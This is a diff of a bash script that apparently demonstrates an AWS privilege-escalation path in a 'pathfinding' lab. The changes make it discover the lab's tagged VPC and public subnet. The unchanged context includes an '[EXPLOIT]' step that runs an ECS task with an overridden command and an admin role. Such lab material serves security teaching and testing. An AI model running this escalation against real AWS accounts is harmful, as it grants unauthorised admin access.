@@ -207,36 +207,31 @@ echo -e "${GREEN}✓ Found existing task definition to override${NC}\n"
 # Step 7: Find network configuration for ECS task
 echo -e "${YELLOW}Step 7: Finding network configuration for ECS task${NC}"
 
-# Get default VPC
-show_cmd "ReadOnly" "aws ec2 describe-vpcs --region $AWS_REGION --filters 'Name=is-default,Values=true' --query 'Vpcs[0].VpcId' --output text"
-DEFAULT_VPC=$(aws ec2 describe-vpcs \
-    --region $AWS_REGION \
-    --filters "Name=is-default,Values=true" \
-    --query 'Vpcs[0].VpcId' \
-    --output text)
+# Discover the custom network deployed by the lab environment.
+show_cmd "ReadOnly" "aws ec2 describe-vpcs --region \"$AWS_REGION\" --filters \"Name=tag:Name,Values=pathfinding\" \"Name=is-default,Values=false\" --query 'Vpcs[].VpcId' --output text"
+LAB_VPC=$(aws ec2 describe-vpcs --region "$AWS_REGION" \
+  --filters "Name=tag:Name,Values=pathfinding" "Name=is-default,Values=false" \
+  --query 'Vpcs[].VpcId' --output text) || exit 1
 
-if [ -z "$DEFAULT_VPC" ] || [ "$DEFAULT_VPC" == "None" ]; then
-    echo -e "${RED}Error: Could not find default VPC${NC}"
-    echo "Please ensure a default VPC exists in region: $AWS_REGION"
-    exit 1
+if [[ ! "$LAB_VPC" =~ ^vpc-[0-9a-f]+$ ]]; then
+  echo "Expected exactly one custom pathfinding VPC. Check the account, region, and lab environment deployment." >&2
+  exit 1
 fi
 
-echo "Default VPC: $DEFAULT_VPC"
+show_cmd "ReadOnly" "aws ec2 describe-subnets --region \"$AWS_REGION\" --filters \"Name=vpc-id,Values=$LAB_VPC\" \"Name=tag:Name,Values=pathfinding Operational Subnet 1\" \"Name=map-public-ip-on-launch,Values=true\" --query 'Subnets[].SubnetId' --output text"
+LAB_SUBNET=$(aws ec2 describe-subnets --region "$AWS_REGION" \
+  --filters "Name=vpc-id,Values=$LAB_VPC" \
+    "Name=tag:Name,Values=pathfinding Operational Subnet 1" \
+    "Name=map-public-ip-on-launch,Values=true" \
+  --query 'Subnets[].SubnetId' --output text) || exit 1
 
-# Get a subnet from the default VPC
-show_cmd "ReadOnly" "aws ec2 describe-subnets --region $AWS_REGION --filters 'Name=vpc-id,Values=$DEFAULT_VPC' --query 'Subnets[0].SubnetId' --output text"
-DEFAULT_SUBNET=$(aws ec2 describe-subnets \
-    --region $AWS_REGION \
-    --filters "Name=vpc-id,Values=$DEFAULT_VPC" \
-    --query 'Subnets[0].SubnetId' \
-    --output text)
-
-if [ -z "$DEFAULT_SUBNET" ] || [ "$DEFAULT_SUBNET" == "None" ]; then
-    echo -e "${RED}Error: Could not find subnet in default VPC${NC}"
-    exit 1
+if [[ ! "$LAB_SUBNET" =~ ^subnet-[0-9a-f]+$ ]]; then
+  echo "Expected exactly one public Pathfinding Operational Subnet 1 in $LAB_VPC." >&2
+  exit 1
 fi
 
-echo "Using Subnet: $DEFAULT_SUBNET"
+echo "Pathfinding VPC: $LAB_VPC"
+echo "Public subnet: $LAB_SUBNET"
 echo -e "${GREEN}✓ Network configuration identified${NC}\n"
 
 # [EXPLOIT] Run ECS task with overridden command and admin role
@@ -276,13 +271,13 @@ OVERRIDES=$(cat <<EOF
 EOF
 )
 
-show_attack_cmd "Attacker" "aws ecs run-task --region $AWS_REGION --cluster $CLUSTER_NAME --task-definition $EXISTING_TASK_FAMILY --launch-type FARGATE --network-configuration \"awsvpcConfiguration={subnets=[$DEFAULT_SUBNET],assignPublicIp=ENABLED}\" --overrides '$OVERRIDES'"
+show_attack_cmd "Attacker" "aws ecs run-task --region $AWS_REGION --cluster $CLUSTER_NAME --task-definition $EXISTING_TASK_FAMILY --launch-type FARGATE --network-configuration \"awsvpcConfiguration={subnets=[$LAB_SUBNET],assignPublicIp=ENABLED}\" --overrides '$OVERRIDES'"
 RUN_TASK_RESULT=$(aws ecs run-task \
     --region $AWS_REGION \
     --cluster $CLUSTER_NAME \
     --task-definition $EXISTING_TASK_FAMILY \
     --launch-type FARGATE \
-    --network-configuration "awsvpcConfiguration={subnets=[$DEFAULT_SUBNET],assignPublicIp=ENABLED}" \
+    --network-configuration "awsvpcConfiguration={subnets=[$LAB_SUBNET],assignPublicIp=ENABLED}" \
     --overrides "$OVERRIDES" \
     --output json)
 
